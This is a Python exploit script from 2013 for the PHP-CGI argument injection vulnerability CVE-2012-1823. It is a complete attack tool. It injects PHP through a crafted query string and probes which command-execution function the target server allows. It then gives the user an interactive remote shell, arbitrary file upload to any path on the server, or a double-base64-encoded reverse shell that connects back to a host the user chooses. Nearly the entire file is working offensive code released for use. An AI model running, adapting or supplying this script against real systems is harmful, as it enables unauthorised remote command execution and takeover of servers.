#!/usr/bin/python
# This exploit brought to you
# by Insecurety Research (2013)
# Author: infodox
# Twitter: @info_dox 
# Site: insecurety.net
# CVE: 2012-1823
# I know its a bit late in the game...
# But seeing as the Plesk bug is now killed
# and this bug is long dead, may as well drop
# the exploit for both and include some of the
# payload library. Enjoy!
import payloads
from payloads import all
import argparse
import requests
import sys

help = """Exploits the PHP-CGI Arguement Injection Vulnerability"""
parser = argparse.ArgumentParser(description=help)
parser.add_argument("--target", help="Target IP", required=True)
parser.add_argument("--mode", help="RSH (reverse shell), UP (upload) or SH (inline shell)", default="SH")
parser.add_argument("--lfile", help="File to Upload (full path)")
parser.add_argument("--rfile", help="Where to put the file on the server (full path)")
parser.add_argument("--lhost", help="Host to connect back to", default="127.0.0.1")
parser.add_argument("--lport", help="Port to connect back to", default="4444")
parser.add_argument("--stype", help="Reverse Shell Type - Python or Perl", default="perl")
args = parser.parse_args()

target = args.target
mode = args.mode
localfile = args.lfile
remotefile = args.rfile
lhost = args.lhost
lport = args.lport
stype = args.stype

tester = """echo w00tw00tw00t"""
testkey = """w00tw00tw00t"""
url = "http://"+target+"/?-d+allow_url_include%-7d1+-d+auto_prepend_file%3dphp://input"

def genrshell(lhost, lport, stype):
    if stype == "perl":
        rshell = payloads.linux.perl.reverse_oneline(lhost, lport)
    elif stype == "python":
        rshell = payloads.linux.python.reverse_oneline(lhost, lport)
    return rshell

def genphp(func, cmd):
    if func == "system":
        rawphp = """system('%s');""" %(cmd)
    elif func == "shellexec":
        rawphp = """echo shell_exec('%s');""" %(cmd)
    elif func == "passthru":
        rawphp = """passthru('%s');""" %(cmd)
    elif func == "exec":
        rawphp = """echo exec('%s');""" %(cmd)
    encodedphp = rawphp.encode('base64')
    payload = """<?php eval(base64_decode('%s'));die(); ?>""" %(encodedphp)
    return payload

def genencphp(func, cmd):
    encoded = cmd.encode('base64')
    encoded = encoded.strip()
    encoded = encoded.replace('\n', '')
    encoded = encoded.encode('base64')
    encoded = encoded.strip()
    encoded = encoded.replace('\n', '') # BADCHARS EH? ILL ENCODE THEM SHITS YO
    if func == "system":
        raw = """system(base64_decode(base64_decode('%s')));""" %(encoded)
    elif func == "shellexec":
        raw = """shell_exec(base64_decode(base64_decode('%s')));""" %(encoded)
    else:
        print "Not Implemented :("
        sys.exit(0)
    payload = """<?php %s ?>""" %(raw)
    return payload

def test(url, tester, testkey): # This whole function is ugly as sin
    print "[+] Testing system()" # I need to make it tighter
    payload = genphp('system', tester) # No, really. Look at the waste
    r = requests.post(url, payload) # It could be TIIINY and fast!
    if testkey in r.text:
        print "[+] system() works, using system."
        func = 'system'
        return func
    else:
        print "[-] system() seems disabled :("
        pass
    print "[+] Testing shell_exec()" # LOOK AT THE FORKING CODE REUSE
    payload = genphp('shellexec', tester) # THIS COULD BE TINY
    r = requests.post(url, payload)  # But. Coffee is lacking
    if testkey in r.text:
        print "[+] shell_exec() works, using shell_exec"
        func = 'shellexec'
        return func
    else:
        print "[-] shell_exec() seems disabled :("
        pass
    print "[+] Testing passthru()"
    payload = genphp('passthru', tester)
    r = requests.post(url, payload)
    if testkey in r.text:
        print "[+] passthru() works, using passthru"
        func = 'passthru'
        return func
    else:
        print "[-] passthru() seems disabled :("
        pass
    print "[+] Testing exec()"
    payload = genphp('exec', tester)
    r = requests.post(url, payload)
    if testkey in r.text:
        print "[+] exec() works, using exec"
        func = 'exec'
        return func
    else:
        print "[-] exec() seems disabled :("
        pass

def shell():
    func = test(url, tester, testkey)
    while True:
        try:
            cmd = raw_input("shell:~$ ")
            if cmd == "quit":
                print "\n[-] Quitting"
                sys.exit(0)
            elif cmd == "exit":
                print "\n[-] Quitting"
                sys.exit(0)
            else:
                try:
                    payload = genphp(func, cmd)
                    hax = requests.post(url, payload)
                    print hax.text
                except Exception or KeyboardInterrupt:
                    print "[-] Exception Caught, I hope"
                    sys.exit(-5)
        except Exception or KeyboardInterrupt:
            print "[-] Exception or CTRL+C Caught, I hope"
            print "[-] Exiting (hopefully) cleanly..."
            sys.exit(0)

def upload(url, localfile, remotefile):
    f = open(localfile, "r")
    rawfiledata = f.read()
    encodedfiledata = rawfiledata.encode('base64')
    phppayload = """<?php
    $f = fopen("%s", "a");
    $x = base64_decode('%s');
    fwrite($f, "$x");
    fclose($f);
    ?>""" %(remotefile, encodedfiledata) # I need to add a hashing function sometime for corruption test.

    print "[+] Uploading File"
    requests.post(url, phppayload) # this is why I love the python requests library
    print "[+] Upload should be complete"
    sys.exit(0)

def rshell():
    func = test(url, tester, testkey)
    rshell = genrshell(lhost, lport, stype)
    print "[+] Generating Payload"
    payload = genencphp(func, rshell)
    print "[+] Sending reverse shell to %s:%s" %(lhost, lport)
    requests.post(url, payload)
    print "[<3] Exiting..."
    sys.exit(0)

def main(target, mode):
    print "[+] Target is: %s" %(target)
    if mode == "UP":
        upload(url, localfile, remotefile)
    elif mode == "SH":
        shell()
    elif mode == "RSH":
        rshell()
    else:
        print "[-] Mode Invalid... Exit!"
        sys.exit(0)

main(target, mode)
